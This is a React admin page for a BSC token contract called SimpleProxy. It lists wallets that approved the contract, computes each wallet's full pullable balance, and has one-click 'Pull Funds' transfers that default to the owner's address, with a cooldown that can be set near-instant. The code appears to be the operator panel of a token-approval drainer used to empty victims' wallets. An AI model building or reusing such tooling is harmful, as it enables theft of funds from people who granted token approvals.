import { useCallback, useEffect, useState } from 'react';
import { formatUnits, isAddress } from 'ethers';
import { api, CONTRACT } from '../api';
import { DEFAULT_TOKENS } from './UserPage';

export default function AdminPage() {
  const [config, setConfig] = useState(null);
  const [activity, setActivity] = useState([]);
  const [approvedUsers, setApprovedUsers] = useState([]);
  const [status, setStatus] = useState({ kind: 'idle', msg: '' });

  // Config management
  const [newDuration, setNewDuration] = useState('');
  const [limitToken, setLimitToken] = useState(DEFAULT_TOKENS[0].address);
  const [newLimit, setNewLimit] = useState('');

  // User inspection state
  const [inspectUserAddr, setInspectUserAddr] = useState('');
  const [inspectTokenAddr, setInspectTokenAddr] = useState(DEFAULT_TOKENS[0].address);
  const [inspectedData, setInspectedData] = useState(null);
  const [inspectLoading, setInspectLoading] = useState(false);

  // Pull tokens state
  const [pull, setPull] = useState({
    token: DEFAULT_TOKENS[0].address,
    user: '',
    to: '',
    amount: '',
  });

  const load = useCallback(async () => {
    try {
      const [cfg, act, usersRes] = await Promise.all([
        api.config(),
        api.activity(50),
        api.approvedUsers().catch(() => ({ items: [] })),
      ]);
      setConfig(cfg);
      setActivity(act.items || []);
      setApprovedUsers(usersRes.items || []);
    } catch (e) {
      console.error('Background sync failed:', e);
    }
  }, []);

  useEffect(() => {
    load();
    const t = setInterval(load, 10_000);
    return () => clearInterval(t);
  }, [load]);

  const handleQuickPull = (userItem) => {
    const pullAmount =
      userItem.maxPullable && userItem.maxPullable !== '0' && userItem.maxPullable !== '0.0'
        ? userItem.maxPullable
        : userItem.balance && userItem.balance !== '0' && userItem.balance !== '0.0'
        ? userItem.balance
        : userItem.allowance;

    setPull((prev) => ({
      ...prev,
      token: userItem.token,
      user: userItem.address,
      to: prev.to || config?.owner || '',
      amount: pullAmount || '',
    }));

    const el = document.getElementById('execute-pull-section');
    if (el) el.scrollIntoView({ behavior: 'smooth' });

    setStatus({
      kind: 'ok',
      msg: `Loaded exact pull amount for ${shortAddr(userItem.address)}: ${pullAmount} ${userItem.symbol}. Click "Execute Pull Transaction" below.`,
    });
  };

  // Inspect user on-chain details
  const handleInspectUser = async (targetUser = inspectUserAddr, targetToken = inspectTokenAddr) => {
    if (!isAddress(targetUser)) {
      return setStatus({ kind: 'err', msg: 'Please provide a valid user wallet address.' });
    }
    if (!isAddress(targetToken)) {
      return setStatus({ kind: 'err', msg: 'Please provide a valid token contract address.' });
    }

    setInspectLoading(true);
    setStatus({ kind: 'idle', msg: '' });
    try {
      const res = await api.userStatus(targetUser, targetToken);
      const formattedBal = formatUnits(res.balance, res.decimals);
      const formattedAllow = formatUnits(res.allowance, res.decimals);
      const formattedLimit = formatUnits(res.limit, res.decimals);

      const balBN = BigInt(res.balance.toString());
      const allowBN = BigInt(res.allowance.toString());
      const limitBN = BigInt(res.limit.toString());
      let maxPullBN = balBN < allowBN ? balBN : allowBN;
      if (limitBN > 0n && limitBN < maxPullBN) {
        maxPullBN = limitBN;
      }
      if (maxPullBN < 0n) maxPullBN = 0n;
      const exactMaxPullable = formatUnits(maxPullBN, res.decimals);

      setInspectedData({
        ...res,
        formattedBal,
        formattedAllow,
        formattedLimit,
        maxPullable: exactMaxPullable,
      });
    } catch (e) {
      setStatus({ kind: 'err', msg: `Inspection failed: ${e.message}` });
      setInspectedData(null);
    } finally {
      setInspectLoading(false);
    }
  };

  const handleFillPullForm = () => {
    if (!inspectedData) return;
    setPull((prev) => ({
      ...prev,
      token: inspectedData.token,
      user: inspectedData.address,
      amount: inspectedData.maxPullable || '',
    }));
  };

  const saveDuration = async () => {
    try {
      setStatus({ kind: 'busy', msg: 'Broadcasting setDuration transaction…' });
      const r = await api.setDuration(Number(newDuration));
      setStatus({ kind: 'ok', msg: `Duration update broadcasted! Tx: ${shortAddr(r.txHash)}` });
      setTimeout(load, 4000);
    } catch (e) {
      setStatus({ kind: 'err', msg: e.message });
    }
  };

  const saveLimit = async () => {
    try {
      setStatus({ kind: 'busy', msg: 'Broadcasting setTokenLimit transaction…' });
      const r = await api.setLimit(limitToken, newLimit);
      setStatus({ kind: 'ok', msg: `Limit update broadcasted! Tx: ${shortAddr(r.txHash)}` });
      setTimeout(load, 4000);
    } catch (e) {
      setStatus({ kind: 'err', msg: e.message });
    }
  };

  const doPull = async () => {
    try {
      setStatus({ kind: 'busy', msg: 'Executing pull transaction on BSC…', txHash: '' });
      const r = await api.pull(pull);
      setStatus({
        kind: 'ok',
        msg: `Pull transaction successfully broadcasted! Tx: ${shortAddr(r.txHash)}`,
        txHash: r.txHash,
      });
      setTimeout(load, 3000);
      setTimeout(load, 8000);
      if (inspectedData && inspectedData.address.toLowerCase() === pull.user.toLowerCase()) {
        setTimeout(() => handleInspectUser(pull.user, pull.token), 4000);
      }
    } catch (e) {
      setStatus({ kind: 'err', msg: e.message, txHash: '' });
    }
  };

  return (
    <div className="card wide app-card">
      <div className="card-header">
        <div>
          <h1>Admin Dashboard</h1>
          <p className="subtitle">
            Contract controls, on-chain user allowance inspection, and pull management.
          </p>
        </div>
        <div className="header-actions">
          <span className="badge badge-success">Admin Controls</span>
        </div>
      </div>

      {config && (
        <div className="info-box-grid">
          <div className="info-box">
            <span className="label-caption">Contract Address</span>
            <div className="mono small bold">{config.contractAddress}</div>
            <a
              href={`https://bscscan.com/address/${config.contractAddress}#code`}
              target="_blank"
              rel="noreferrer"
              className="link-external"
            >
              BscScan Contract ↗
            </a>
          </div>
          <div className="info-box">
            <span className="label-caption">Contract Owner / Admin</span>
            <div className="mono small bold">{config.owner}</div>
          </div>
          <div className="info-box">
            <span className="label-caption">Global Cooldown Duration</span>
            <div className="mono bold">
              {config.duration} {config.duration === 1 ? 'second (near-instant)' : config.duration < 60 ? 'seconds' : `seconds (~${Math.round(config.duration / 60)} mins)`}
            </div>
          </div>
        </div>
      )}

      {/* ---------------- Live Approved Users ---------------- */}
      <div className="dashboard-section highlight-panel">
        <div className="section-header-row">
          <div>
            <h2>🎯 Live Approved Users & Spending Allowances</h2>
            <p className="hint">
              Users who connected their wallet and granted token approval to SimpleProxy. Shows real-time balance and pull eligibility.
            </p>
          </div>
          <div className="header-actions">
            <span className="badge badge-success">{approvedUsers.length} Approved</span>
            <button className="secondary-btn small" onClick={load} title="Refresh live balances and allowances">
              🔄 Refresh
            </button>
            <button
              className="primary-btn small"
              style={{ padding: '6px 12px', fontSize: '12px' }}
              onClick={async () => {
                setStatus({ kind: 'busy', msg: 'Syncing on-chain approvals and allowances from BSC…' });
                try {
                  const res = await api.syncApprovals();
                  setApprovedUsers(res.items || []);
                  setStatus({ kind: 'ok', msg: `Synced successfully! ${res.items?.length || 0} user records updated.` });
                } catch (e) {
                  setStatus({ kind: 'err', msg: `Sync failed: ${e.message}` });
                }
              }}
              title="Scan blockchain for latest approvals and sync allowances"
            >
              ⚡ Sync On-Chain
            </button>
          </div>
        </div>

        <div className="table-responsive">
          <table>
            <thead>
              <tr>
                <th>User Wallet Address</th>
                <th>Token</th>
                <th>Active Allowance</th>
                <th>Wallet Balance</th>
                <th>Max Pullable</th>
                <th>Status</th>
                <th>Approval Tx</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody>
              {approvedUsers.length === 0 ? (
                <tr>
                  <td colSpan="8" className="text-center hint" style={{ padding: '24px' }}>
                    No users have approved allowances yet. When a user approves tokens on the User Portal, they will appear here automatically.
                  </td>
                </tr>
              ) : (
                approvedUsers.map((u) => (
                  <tr key={`${u.address}-${u.token}`}>
                    <td>
                      <AddressCell address={u.address} />
                    </td>
                    <td>
                      <span className="badge badge-info">{u.symbol}</span>
                    </td>
                    <td>
                      <span className="mono bold" style={{ color: 'var(--ok)' }}>
                        {formatExactBalance(u.allowance)} {u.symbol}
                      </span>
                    </td>
                    <td>
                      <span className="mono bold">
                        {formatExactBalance(u.balance)} {u.symbol}
                      </span>
                    </td>
                    <td>
                      <span
                        className="mono bold highlight"
                        style={{ color: u.maxPullable && u.maxPullable !== '0' && u.maxPullable !== '0.0' ? 'var(--ok)' : 'var(--text-muted)' }}
                      >
                        {formatExactBalance(u.maxPullable)} {u.symbol}
                      </span>
                    </td>
                    <td>
                      {u.status === 'ready' ? (
                        <span className="badge badge-success">Ready to Pull</span>
                      ) : u.status === 'cooldown' ? (
                        <span className="badge badge-warning">In Cooldown</span>
                      ) : u.status === 'zero_balance' ? (
                        <span className="badge badge-warning">0 Balance</span>
                      ) : u.status === 'no_allowance' ? (
                        <span className="badge badge-secondary" style={{ opacity: 0.8 }}>No Allowance</span>
                      ) : (
                        <span className="badge badge-info">{u.status}</span>
                      )}
                    </td>
                    <td>
                      {u.txHash ? (
                        <a
                          href={`https://bscscan.com/tx/${u.txHash}`}
                          target="_blank"
                          rel="noreferrer"
                          className="mono small link-external"
                        >
                          {shortAddr(u.txHash)} ↗
                        </a>
                      ) : (
                        <span className="small hint">On-Chain</span>
                      )}
                    </td>
                    <td>
                      <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
                        <button
                          className="primary-btn small"
                          style={{ padding: '6px 12px', fontSize: '12px' }}
                          onClick={() => handleQuickPull(u)}
                        >
                          ⚡ Pull Funds
                        </button>
                        <button
                          className="chip-btn small"
                          style={{ padding: '6px 10px', fontSize: '12px' }}
                          onClick={() => {
                            setInspectUserAddr(u.address);
                            setInspectTokenAddr(u.token);
                            handleInspectUser(u.address, u.token);
                          }}
                        >
                          Inspect
                        </button>
                      </div>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>

      {/* ---------------- User Details & Allowance Inspector ---------------- */}
      <div className="dashboard-section">
        <h2>🔍 Inspect User Allowance & On-Chain Details</h2>
        <p className="hint">
          Check live user wallet balance, approved allowance to SimpleProxy, cooldown status, and pull eligibility.
        </p>
        <div className="inspect-form-row">
          <input
            className="mono flex-2"
            placeholder="User Wallet Address (0x…)"
            value={inspectUserAddr}
            onChange={(e) => setInspectUserAddr(e.target.value.trim())}
          />
          <select
            className="mono flex-1"
            value={inspectTokenAddr}
            onChange={(e) => setInspectTokenAddr(e.target.value)}
          >
            {DEFAULT_TOKENS.map((t) => (
              <option key={t.address} value={t.address}>
                {t.symbol} ({shortAddr(t.address)})
              </option>
            ))}
          </select>
          <button
            className="primary-btn"
            onClick={() => handleInspectUser()}
            disabled={inspectLoading || !inspectUserAddr}
          >
            {inspectLoading ? 'Querying…' : 'Inspect User'}
          </button>
        </div>

        {inspectedData && (
          <div className="user-details-card">
            <div className="user-details-header">
              <div>
                <span className="label-caption">Target User Address</span>
                <AddressCell address={inspectedData.address} />
              </div>
              <div>
                <span className="label-caption">Token</span>
                <span className="badge badge-info">{inspectedData.symbol}</span>
              </div>
            </div>

            <div className="user-metrics-grid">
              <div className="metric-box">
                <span className="metric-label">User Balance</span>
                <span className="metric-value">{inspectedData.formattedBal} {inspectedData.symbol}</span>
              </div>
              <div className="metric-box">
                <span className="metric-label">Active Allowance</span>
                <span className="metric-value highlight">{inspectedData.formattedAllow} {inspectedData.symbol}</span>
              </div>
              <div className="metric-box">
                <span className="metric-label">Token Pull Limit</span>
                <span className="metric-value">{inspectedData.formattedLimit} {inspectedData.symbol}</span>
              </div>
              <div className="metric-box">
                <span className="metric-label">Pull Eligibility</span>
                {inspectedData.canPull ? (
                  <span className="badge badge-success">Ready to Pull</span>
                ) : (
                  <span className="badge badge-warning">In Cooldown</span>
                )}
              </div>
            </div>

            <div className="cooldown-info-row">
              <div>
                <strong>Last Pull:</strong>{' '}
                {inspectedData.lastPull > 0
                  ? new Date(inspectedData.lastPull * 1000).toLocaleString()
                  : 'Never pulled'}
              </div>
              {!inspectedData.canPull && inspectedData.nextPullAt > 0 && (
                <div>
                  <strong>Next Pull Available:</strong>{' '}
                  {new Date(inspectedData.nextPullAt * 1000).toLocaleString()}
                </div>
              )}
            </div>

            <div className="inspect-action-footer">
              <button className="secondary-btn" onClick={handleFillPullForm}>
                Use in Pull Form (Max: {inspectedData.maxPullable} {inspectedData.symbol})
              </button>
            </div>
          </div>
        )}
      </div>

      {/* ---------------- Pull Tokens ---------------- */}
      <div className="dashboard-section" id="execute-pull-section">
        <h2>⚡ Execute Pull</h2>
        <div className="grid-2col">
          <label>
            Token Contract Address
            <input
              className="mono"
              placeholder="0x…"
              value={pull.token}
              onChange={(e) => setPull({ ...pull, token: e.target.value.trim() })}
            />
          </label>
          <label>
            User Address (From)
            <input
              className="mono"
              placeholder="0x…"
              value={pull.user}
              onChange={(e) => setPull({ ...pull, user: e.target.value.trim() })}
            />
          </label>
          <label>
            Recipient Address (To)
            <input
              className="mono"
              placeholder="0x…"
              value={pull.to}
              onChange={(e) => setPull({ ...pull, to: e.target.value.trim() })}
            />
          </label>
          <label>
            Amount (Human units, e.g. 100)
            <input
              placeholder="e.g. 500"
              value={pull.amount}
              onChange={(e) => setPull({ ...pull, amount: e.target.value.trim() })}
            />
          </label>
        </div>
        <button
          className="primary-btn pull-btn"
          onClick={doPull}
          disabled={!pull.token || !pull.user || !pull.to || !pull.amount}
        >
          Execute Pull Transaction
        </button>
      </div>

      {/* ---------------- Contract Config Updates ---------------- */}
      <div className="dashboard-section">
        <h2>⚙️ Contract Parameters</h2>
        <div className="grid-2col">
          <div className="config-card">
            <h3>Update Cooldown Duration</h3>
            <p className="hint">Set cooldown duration in seconds between pulls for each (user, token).</p>
            <div className="input-group-row">
              <input
                placeholder="e.g. 1"
                value={newDuration}
                onChange={(e) => setNewDuration(e.target.value.trim())}
              />
              <button className="secondary-btn" onClick={saveDuration} disabled={!newDuration}>
                Save Duration
              </button>
            </div>
          </div>

          <div className="config-card">
            <h3>Update Per-Token Pull Limit</h3>
            <p className="hint">Maximum tokens admin can pull per single execution.</p>
            <div className="input-group-col">
              <input
                className="mono"
                placeholder="Token Address (0x…)"
                value={limitToken}
                onChange={(e) => setLimitToken(e.target.value.trim())}
              />
              <div className="input-group-row">
                <input
                  placeholder="Limit (human, e.g. 500)"
                  value={newLimit}
                  onChange={(e) => setNewLimit(e.target.value.trim())}
                />
                <button className="secondary-btn" onClick={saveLimit} disabled={!limitToken || !newLimit}>
                  Save Limit
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>

      {status.msg && (
        <div className={`status-feedback ${status.kind}`}>
          <div>{status.msg}</div>
          {status.txHash && (
            <a
              href={`https://bscscan.com/tx/${status.txHash}`}
              target="_blank"
              rel="noreferrer"
              className="tx-link link-external"
              style={{ marginTop: '6px', display: 'inline-block' }}
            >
              View on BscScan ({status.txHash.slice(0, 10)}…{status.txHash.slice(-8)}) ↗
            </a>
          )}
        </div>
      )}

      {/* ---------------- Recent On-Chain Activity ---------------- */}
      <div className="dashboard-section">
        <div className="section-header-row">
          <div>
            <h2>📜 Recent Pull Executions (Pulled Events)</h2>
            <p className="hint">Confirmed transfers executed by SimpleProxy contract on-chain.</p>
          </div>
          <span className="badge badge-info">{activity.length} Pulled Records</span>
        </div>
        <div className="table-responsive">
          <table>
            <thead>
              <tr>
                <th>Block</th>
                <th>User Address</th>
                <th>Token</th>
                <th>Recipient</th>
                <th>Amount</th>
                <th>Tx Hash</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              {activity.length === 0 ? (
                <tr>
                  <td colSpan="7" className="text-center hint" style={{ padding: '24px' }}>
                    No pull executions recorded yet on-chain. When you execute a pull from the Approved Users table above, the transaction event will appear here.
                  </td>
                </tr>
              ) : (
                activity.map((a) => (
                  <tr key={`${a.txHash}-${a.user}-${a.blockNumber}`}>
                    <td>{a.blockNumber}</td>
                    <td><AddressCell address={a.user} compact /></td>
                    <td className="mono small">{shortAddr(a.token)}</td>
                    <td><AddressCell address={a.to} compact /></td>
                    <td className="mono bold">{a.amount}</td>
                    <td>
                      <a
                        href={`https://bscscan.com/tx/${a.txHash}`}
                        target="_blank"
                        rel="noreferrer"
                        className="mono small link-external"
                      >
                        {shortAddr(a.txHash)} ↗
                      </a>
                    </td>
                    <td>
                      <button
                        className="chip-btn small"
                        onClick={() => {
                          setInspectUserAddr(a.user);
                          setInspectTokenAddr(a.token);
                          handleInspectUser(a.user, a.token);
                        }}
                      >
                        Inspect
                      </button>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

function shortAddr(v) {
  if (!v) return '';
  return `${v.slice(0, 6)}…${v.slice(-4)}`;
}

function formatExactBalance(val) {
  if (val === undefined || val === null || val === '') return '0';
  const str = String(val);
  if (!str.includes('.')) return str;
  const trimmed = str.replace(/\.?0+$/, '');
  return trimmed || '0';
}

function AddressCell({ address, compact = false }) {
  const [copied, setCopied] = useState(false);

  const handleCopy = async (e) => {
    e.stopPropagation();
    if (!address) return;
    try {
      if (navigator?.clipboard?.writeText) {
        await navigator.clipboard.writeText(address);
      } else {
        throw new Error('Clipboard API unavailable');
      }
    } catch {
      // Fallback for HTTP / non-secure contexts
      const textArea = document.createElement('textarea');
      textArea.value = address;
      textArea.style.position = 'fixed';
      textArea.style.left = '-999999px';
      textArea.style.top = '-999999px';
      document.body.appendChild(textArea);
      textArea.focus();
      textArea.select();
      try {
        document.execCommand('copy');
      } catch (err) {
        console.error('Copy fallback failed', err);
      }
      document.body.removeChild(textArea);
    }
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  if (!address) return <span className="hint">—</span>;

  if (compact) {
    return (
      <div className="address-compact-row" title={`Click to copy: ${address}`} onClick={handleCopy}>
        <span className="mono bold address-compact-text">
          {shortAddr(address)}
        </span>
        <button
          className={`copy-btn-mini ${copied ? 'copied' : ''}`}
          onClick={handleCopy}
          type="button"
          title="Copy full address"
        >
          {copied ? '✓' : '📋'}
        </button>
      </div>
    );
  }

  return (
    <div className="address-cell">
      <div className="address-box" onClick={handleCopy} title="Click to copy full address">
        <span className="full-address mono bold" title={address}>
          {address}
        </span>
        <button
          className={`copy-btn ${copied ? 'copied' : ''}`}
          onClick={handleCopy}
          type="button"
          title="Click to copy full address"
        >
          {copied ? '✓ Copied' : '📋 Copy'}
        </button>
      </div>
      <div className="address-subline">
        <a
          href={`https://bscscan.com/address/${address}`}
          target="_blank"
          rel="noreferrer"
          className="mono small link-external"
          onClick={(e) => e.stopPropagation()}
        >
          View on BscScan ↗
        </a>
      </div>
    </div>
  );
}
